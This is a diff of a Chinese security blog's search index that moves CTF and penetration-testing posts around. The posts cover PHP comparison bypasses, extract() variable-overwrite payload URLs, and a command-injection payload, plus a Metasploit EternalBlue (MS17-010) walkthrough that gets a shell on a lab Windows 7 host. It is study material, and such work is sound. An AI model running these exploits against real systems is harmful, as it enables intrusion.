@@ -1,86 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTF中常见的黑魔法</title>
-    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
-    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
-<a id="more"></a>
-<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
-<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
-<p>1.0e开头的全部相等（==判断）</p>
-<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
-<p>Md5和sha1一样</p>
-<p>2.利用数组绕过（===判断）</p>
-<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
-<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
-<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
-<p><strong>代码测试</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>get 传参 password[]  数组，成功打出flag</p>
-<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
-<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
-<p><strong>定义和用途</strong></p>
-<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
-<p>1.数组绕过</p>
-<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
-<p>2.%00截断绕过== 的比较</p>
-<p>测试环境： php5.3版本，php7不行</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
-<p>加入%00，可以发现后面的c被截断了</p>
-<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
-<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
-<ol>
-<li>
-<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
-</li>
-<li>
-<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
-</li>
-</ol>
-<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
-<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
-<ul>
-<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
-<ul>
-<li>布尔值true和任意字符串都弱相等。例如:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
-<ul>
-<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
-<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
-<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
-</ul>
-<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
-<p>直接看题</p>
-<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
-<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
-<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
-<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
-<p>该函数返回成功设置的变量数目。</p>
-<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
-<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
-<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
-<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
-<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
-<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
-<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
-<p>2. if($a==$c) == 》 TRUE</p>
-<p>构造payload：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
-<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
-<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Buuctf刷题记录(二)</title>
     <url>/2021/01/21/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%BA%8C/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a class="header-anchor" href="#极客大挑战-2019-BuyFlag">¶</a>[极客大挑战 2019]BuyFlag</h2>
@@ -201,6 +121,86 @@
       </categories>
   </entry>
   <entry>
+    <title>CTF中常见的黑魔法</title>
+    <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
+    <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
+<a id="more"></a>
+<h2 id="1-sha1和md5"><a class="header-anchor" href="#1-sha1和md5">¶</a>1.sha1和md5</h2>
+<p><strong>要求变量原值不同但md5或sha1相同的情况下</strong></p>
+<p>1.0e开头的全部相等（==判断）</p>
+<p>240610708 和 QNKCDZO md5值类型相似，但并不相同，在”==”相等操作符的运算下，结果返回了true.</p>
+<p>Md5和sha1一样</p>
+<p>2.利用数组绕过（===判断）</p>
+<p>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断。</p>
+<h2 id="2-strcmp函数的绕过"><a class="header-anchor" href="#2-strcmp函数的绕过">¶</a>2.strcmp函数的绕过</h2>
+<p>strcmp 的参数只能是字符串，当我们传入数组时就会返回NULL，而判断使用的是==，NULL==0是 bool(true)的</p>
+<p><strong>代码测试</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;sadd44484878&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strcmp(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>],<span class="variable">$flag</span>)==<span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>get 传参 password[]  数组，成功打出flag</p>
+<p><a href="https://imgchr.com/i/sCEdxI"><img src="https://s3.ax1x.com/2021/01/03/sCEdxI.png" alt="sCEdxI.png"></a></p>
+<h2 id="3-Ereg匹配"><a class="header-anchor" href="#3-Ereg匹配">¶</a>3.Ereg匹配</h2>
+<p><strong>定义和用途</strong></p>
+<p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。</p>
+<p>1.数组绕过</p>
+<p>ereg是处理字符串，传入数组之后，ereg是返回NULL</p>
+<p>2.%00截断绕过== 的比较</p>
+<p>测试环境： php5.3版本，php7不行</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*<span class="comment">//$test=$_POST[&#x27;a&#x27;];*</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( ereg(<span class="string">&quot;c&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])== <span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;failure&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/sCEhMq"><img src="https://s3.ax1x.com/2021/01/03/sCEhMq.png" alt="sCEhMq.png"></a></p>
+<p>加入%00，可以发现后面的c被截断了</p>
+<p><a href="https://imgchr.com/i/sCE5LV"><img src="https://s3.ax1x.com/2021/01/03/sCE5LV.png" alt="sCE5LV.png"></a></p>
+<h2 id="4-PHP弱类型比较"><a class="header-anchor" href="#4-PHP弱类型比较">¶</a>4.PHP弱类型比较</h2>
+<ol>
+<li>
+<p>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。</p>
+</li>
+<li>
+<p>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p>
+</li>
+</ol>
+<p>当要比较的两种字符串的类型相同时，== 和 === 是相等的。</p>
+<h3 id="PHP转换规则"><a class="header-anchor" href="#PHP转换规则">¶</a><strong>PHP转换规则</strong></h3>
+<ul>
+<li>若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如&quot;aaa&quot;是不能转换为数字的字符串，而&quot;123&quot;或&quot;123aa&quot;就是可以转换为数字的字符串）或null，则转换为0；例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12&quot;)                                   &#x2F;&#x2F; true</span><br><span class="line"> var_dump(12&#x3D;&#x3D;&quot;12aa&quot;)                              &#x2F;&#x2F;true</span><br><span class="line"> var_dump( &quot;admin&quot;&#x3D;&#x3D;0)								&#x2F;&#x2F;true</span><br><span class="line"> var_dump(false&#x3D;&#x3D;&quot;&quot;&#x3D;&#x3D;0&#x3D;&#x3D;NULL)						&#x2F;&#x2F;true</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<ul>
+<li>布尔值true和任意字符串都弱相等。例如:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(true&#x3D;&#x3D;&quot;hyuf&quot;)                   &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>
+<ul>
+<li>数字和“e&quot;开头加上数字的字符串（例如&quot;1e123”）会当作科学计数法去比较；</li>
+<li>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0；</li>
+<li>当字符串被当作一个数值来处理时，如果该字符串没有包含’.’,‘e’,'E’并且其数值在整形的范围之内，该字符串作为int来取值，其他所有情况下都被作为float来取值，并且字符串开始部分决定它的取值，开始部分为数字，则其值就是开始的数字，否则，其值为0。</li>
+</ul>
+<h2 id="5-extract变量覆盖漏洞"><a class="header-anchor" href="#5-extract变量覆盖漏洞">¶</a>5.extract变量覆盖漏洞</h2>
+<p>直接看题</p>
+<p><a href="https://imgchr.com/i/sCVpdO"><img src="https://s3.ax1x.com/2021/01/03/sCVpdO.png" alt="sCVpdO.png"></a></p>
+<h3 id="extract-函数用法："><a class="header-anchor" href="#extract-函数用法：">¶</a>extract()函数用法：</h3>
+<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
+<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
+<p>该函数返回成功设置的变量数目。</p>
+<p>如果当前符号表中有于数组键值变量名相同的，那么用数组键值的变量覆盖</p>
+<h3 id="trim（）函数"><a class="header-anchor" href="#trim（）函数">¶</a>trim（）函数</h3>
+<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_ltrim.asp">ltrim()</a> - 移除字符串左侧的空白字符或其他预定义字符</p>
+<p><a href="http://www.w3school.com.cn/php/func_string_rtrim.asp">rtrim()</a> - 移除字符串右侧的空白字符或其他预定义字符</p>
+<p><strong>我们本题利用extract()函数的变量覆盖漏洞原理构造payload</strong></p>
+<p><strong>漏洞产生原因：extract()函数当只有一个参数时，默认的第二参数是：EXTR_OVERWRITE，如果有变量发生冲突，则覆盖已有的变量。</strong></p>
+<p>代码审计需要满足两个条件：1. if(isset($a)) == 》 TRUE</p>
+<p>2. if($a==$c) == 》 TRUE</p>
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用extract()函数变量覆盖漏洞+php伪协议</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;999&amp;b&#x3D;data:&#x2F;&#x2F;,999</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;利用file_get_content()函数返回字符串+php弱类型（null &#x3D;&#x3D; &quot;string&quot;  &#x3D;&#x3D;》 true）</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;b&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;123.206.87.240:9009&#x2F;1.php?a&#x3D;&amp;c&#x3D;</span><br></pre></td></tr></table></figure>
+<p><s>属于菜鸡的注释： 当file_get_connents 读入的不是一个文件是，返回的是false ，也就是 NULL</s></p>
+<p><s>所以我们可以不对 b变量进行赋值或者随意赋值，只要a 是 NULL 就行，如果要想让a 不是NULL 我们就可以利用php伪协议 data，这里不能使用 php://input 是因为 它限定的是GET方式传参</s></p>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
     <title>DJBCTF之web</title>
     <url>/2021/01/25/DJBCTF%E4%B9%8Bweb/</url>
     <content><![CDATA[<h2 id="veryphp"><a class="header-anchor" href="#veryphp">¶</a>veryphp</h2>
@@ -237,6 +237,63 @@
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>MSF利用MS17_010渗透内网主机</title>
+    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
+    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
+<a id="more"></a>
+<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
+<p>攻击主机:kali-linux-2020</p>
+<p>目标主机:win7主机(测试时关闭了防火墙)</p>
+<pre><code>ip:192.168.94.130
+</code></pre>
+<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
+<p>可以看见开放了 445端口的smb共享文件操作</p>
+<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
+<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
+<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
+<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
+<p>启动msf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>可以看到启动成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+<p>看一看利用的模块</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
+<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
+<p><code>options</code>看一下我们需要设置什么payload</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
+<p>可以看到我们需要设置攻击的ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后 <code>run</code>  或者 <code>exploit</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
+<p>可以看到 可能存在ms17_010漏洞</p>
+<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
+<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后run</p>
+<p>可以看到成功了 进行的是meterpreter了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
+<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
+<p>ipconfig可以看到一些信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
+<p><strong>tip:</strong></p>
+<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
+<p>在meterpreter可以使用 background放入后台进程</p>
+<p>sessions 命令可以看后台进程</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
+<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf利用</category>
       </categories>
   </entry>
   <entry>
@@ -369,63 +426,6 @@
       <categories>
         <category>刷题站</category>
         <category>ctfshow</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MSF利用MS17_010渗透内网主机</title>
-    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
-    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
-<a id="more"></a>
-<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
-<p>攻击主机:kali-linux-2020</p>
-<p>目标主机:win7主机(测试时关闭了防火墙)</p>
-<pre><code>ip:192.168.94.130
-</code></pre>
-<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
-<p>可以看见开放了 445端口的smb共享文件操作</p>
-<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
-<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
-<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
-<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
-<p>启动msf</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
-<p>可以看到启动成功</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
-<p>看一看利用的模块</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
-<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
-<p><code>options</code>看一下我们需要设置什么payload</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
-<p>可以看到我们需要设置攻击的ip</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后 <code>run</code>  或者 <code>exploit</code></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
-<p>可以看到 可能存在ms17_010漏洞</p>
-<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
-<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p>然后run</p>
-<p>可以看到成功了 进行的是meterpreter了</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
-<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
-<p>ipconfig可以看到一些信息</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
-<p><strong>tip:</strong></p>
-<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
-<p>在meterpreter可以使用 background放入后台进程</p>
-<p>sessions 命令可以看后台进程</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
-<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-        <category>msf利用</category>
       </categories>
   </entry>
   <entry>
@@ -1193,27 +1193,6 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
-    <title>python之字符串前面加u,r,f的含义</title>
-    <url>/2021/01/08/python%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%89%8D%E9%9D%A2%E5%8A%A0u,r,f%E7%9A%84%E5%90%AB%E4%B9%89/</url>
-    <content><![CDATA[<p>版本 python3.6及以上</p>
-<a id="more"></a>
-<p><strong>1.u:表示unicode字符串</strong><br>
